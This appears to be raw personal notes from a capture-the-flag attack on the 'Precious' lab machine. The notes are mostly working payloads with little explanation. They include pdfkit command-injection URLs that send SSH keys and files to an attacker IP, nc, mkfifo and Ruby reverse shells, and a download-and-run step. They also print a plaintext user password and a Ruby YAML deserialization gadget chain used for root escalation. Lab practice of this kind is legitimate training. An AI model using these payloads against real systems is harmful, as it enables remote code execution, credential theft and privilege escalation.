@@ -1,0 +1,225 @@
+precious.htb:22
+precious.htb:80
+
+ruby
+
+pdfkit v0.8.6
+
+http://example.com/?name=#{'%20`sleep 5`'}
+ref:https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795
+
+
+http://example.com/?name=#{'%20`wget 10.10.16.36:8000`'}
+
+http://example.com/?name=#{'%20`nc 10.10.16.36 7050 -e /bin/bash`'}
+
+http://example.com/?name=#{'%20`wget 10.10.16.36:8000/?a=$(whoami)`'}
+
+http://example.com/?name=#{'%20`a=$(whoami);wget 10.10.16.23:8000/?a=$a`'}
+
+http://example.com/?name=#{'%20`a=$(pwd);wget 10.10.16.36:8000/?a=$a`'}
+
+http://example.com/?name=#{'%20`a=$(cat /home/ruby/.ssh/id_rsa);wget 10.10.16.36:8000/?a=$a`'}
+
+http://example.com/?name=#{'%20`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.16.23 7050 >/tmp/f`'}
+
+http://example.com/?name=#{'%20`wget 10.10.16.36:8000/aaaaaa.sh`'}
+
+http://example.com/?name=#{'%20`curl 10.10.16.36:8000/aaaaaa.sh --output /home/ruby/aaaaaa.sh`'}
+
+http://example.com/?name=#{'%20`chmod 777 /home/ruby/aaaaaa.sh`'}
+
+http://example.com/?name=#{'%20`/home/ruby/aaaaaa.sh`'}
+
+http://example.com/?name=#{'%20`a=$(ls -al /home/ruby|tr -d " \t\n\r");wget 10.10.16.36:8000/?a=$a`'}
+
+http://example.com/?name=#{'%20`a=$(ls -al /home/henry|tr -d " \t\n\r");wget 10.10.16.36:8000/?a=$a`'}
+
+http://example.com/?name=#{'%20`a=$(ls -al /var/www/pdfapp|tr -d " \t\n\r");wget 10.10.16.36:8000/?a=$a`'}
+
+http://example.com/?name=#{'%20`a=$(cat config/environment.rb|tr -d " \t\n\r");wget 10.10.16.36:8000/?a=$a`'}
+
+http://example.com/?name=#{'%20`ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("10.10.16.6",7050))'`'}
+
+
+
+
+
+
+
+
+
+total36
+drwxr-xr-x6rootroot4096Oct2608:28.
+drwxr-xr-x4rootroot4096Oct2608:28..
+drwxr-xr-x4rootruby4096Oct2608:28app
+drwxr-xr-x2rootruby4096Oct2608:28config
+-rw-r--r--1rootruby59Sep1009:46config.ru
+-rw-r--r--1rootruby99Sep1714:17Gemfile
+-rw-r--r--1rootruby478Sep2605:04Gemfile.lock
+drwxrwxr-x2rootruby4096Jan1513:36pdf
+drwxr-xr-x4rootruby4096Oct2608:28public
+
+total848
+drwxr-xr-x4henryhenry4096Jan3000:06.
+drwxr-xr-x4rootroot4096Oct2608:28..
+lrwxrwxrwx1rootroot9Sep2605:04.bash_history-%3E/dev/null
+-rw-r--r--1henryhenry220Sep2604:40.bash_logout
+-rw-r--r--1henryhenry3526Sep2604:40.bashrc
+-rw-r--r--1henryhenry618Jan3000:06dependencies.yml
+drwx------3henryhenry4096Jan2923:57.gnupg
+-rwxr-xr-x1henryhenry828098Jan2923:56linpeas.sh
+drwxr-xr-x3henryhenry4096Jan2923:49.local
+-rw-r--r--1henryhenry807Sep2604:40.profile
+-rw-r-----1roothenry33Jan2923:36user.txt
+
+
+
+
+require 'bundler/setup'
+
+APP_ENV = ENV["RACK_ENV"] || "development"
+
+Bundler.require :default, APP_ENV.to_sym
+
+require 'rubygems'
+require 'bundler'
+
+require_rel '../app'
+
+
+/home/ruby
+/home/ruby/.profile
+/home/ruby/.cache
+/home/ruby/.cache/fontconfig
+/home/ruby/.cache/fontconfig/CACHEDIR.TAG
+/home/ruby/.cache/fontconfig/8750a791-6268-4630-a416-eea4309e7c79-le64.cache-7
+/home/ruby/.cache/fontconfig/ef96da78-736b-4d54-855c-6cd6306b88f9-le64.cache-7
+/home/ruby/.cache/fontconfig/7fbdb48c-391b-4ace-afa2-3f01182fb901-le64.cache-7
+/home/ruby/.cache/fontconfig/cb67f001-8986-4483-92bd-8d975c0d33c3-le64.cache-7
+/home/ruby/.bash_logout
+/home/ruby/.local
+/home/ruby/.local/share
+/home/ruby/.local/share/nano
+/home/ruby/.bashrc
+/tmp/runtime-ruby
+/dev/pts/4
+/dev/pts/3
+/dev/pts/2
+/dev/pts/1
+/dev/pts/0
+
+/var/www/pdfapp/public
+/var/www/pdfapp/public/images
+/var/www/pdfapp/public/stylesheets
+/var/www/pdfapp/public/stylesheets/style.css
+/var/www/pdfapp/config.ru
+/var/www/pdfapp/config
+/var/www/pdfapp/config/environment.rb
+/var/www/pdfapp/Gemfile
+/var/www/pdfapp/pdf
+/var/www/pdfapp/app
+/var/www/pdfapp/app/views
+/var/www/pdfapp/app/views/index.erb
+/var/www/pdfapp/app/controllers
+/var/www/pdfapp/app/controllers/pdf.rb
+/var/www/pdfapp/Gemfile.lock
+/home/ruby
+/home/ruby/.bundle
+/home/ruby/.bundle/config
+/home/ruby/.profile
+/home/ruby/.cache
+/home/ruby/.cache/fontconfig
+/home/ruby/.cache/fontconfig/CACHEDIR.TAG
+/home/ruby/.cache/fontconfig/8750a791-6268-4630-a416-eea4309e7c79-le64.cache-7
+/home/ruby/.cache/fontconfig/ef96da78-736b-4d54-855c-6cd6306b88f9-le64.cache-7
+/home/ruby/.cache/fontconfig/7fbdb48c-391b-4ace-afa2-3f01182fb901-le64.cache-7
+/home/ruby/.cache/fontconfig/cb67f001-8986-4483-92bd-8d975c0d33c3-le64.cache-7
+/home/ruby/.bash_logout
+/home/ruby/.local
+/home/ruby/.local/share
+/home/ruby/.local/share/nano
+/home/ruby/.bashrc
+/tmp/runtime-ruby
+
+
+find / -perm +r
+
+henry:Q3c1AqGHtoI0aXAYFH
+
+ssh henry@precious.htb
+
+-bash-5.1$ ls -al
+total 36
+drwxr-xr-x 3 henry henry 4096 Feb 13 23:12 .
+drwxr-xr-x 4 root  root  4096 Oct 26 08:28 ..
+lrwxrwxrwx 1 root  root     9 Sep 26 05:04 .bash_history -> /dev/null
+-rw-r--r-- 1 henry henry  220 Sep 26 04:40 .bash_logout
+-rw-r--r-- 1 henry henry 3526 Sep 26 04:40 .bashrc
+-rw-r--r-- 1 henry henry  618 Feb 13 20:41 dependecies.yml
+-rw-r--r-- 1 henry henry  619 Feb 13 23:12 dependencies.yml
+drwxr-xr-x 3 henry henry 4096 Feb 13 12:02 .local
+-rw-r--r-- 1 henry henry  807 Sep 26 04:40 .profile
+-rw-r----- 1 root  henry   33 Feb 13 11:57 user.txt
+
+
+bash-5.1$ sudo -l
+Matching Defaults entries for henry on precious:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User henry may run the following commands on precious:
+    (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
+
+
+https://staaldraad.github.io/post/2021-01-09-universal-rce-ruby-yaml-load-updated/
+
+
+-bash-5.1$ cat dependencies.yml
+
+---
+- !ruby/object:Gem::Installer
+    i: x
+- !ruby/object:Gem::SpecFetcher
+    i: y
+- !ruby/object:Gem::Requirement
+  requirements:
+    !ruby/object:Gem::Package::TarReader
+    io: &1 !ruby/object:Net::BufferedIO
+      io: &1 !ruby/object:Gem::Package::TarReader::Entry
+         read: 0
+         header: "abc"
+      debug_output: &1 !ruby/object:Net::WriteAdapter
+         socket: &1 !ruby/object:Gem::RequestSet
+             sets: !ruby/object:Net::WriteAdapter
+                 socket: !ruby/module 'Kernel'
+                 method_id: :system
+             git_set: "cat /root/root.txt"
+         method_id: :resolve
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
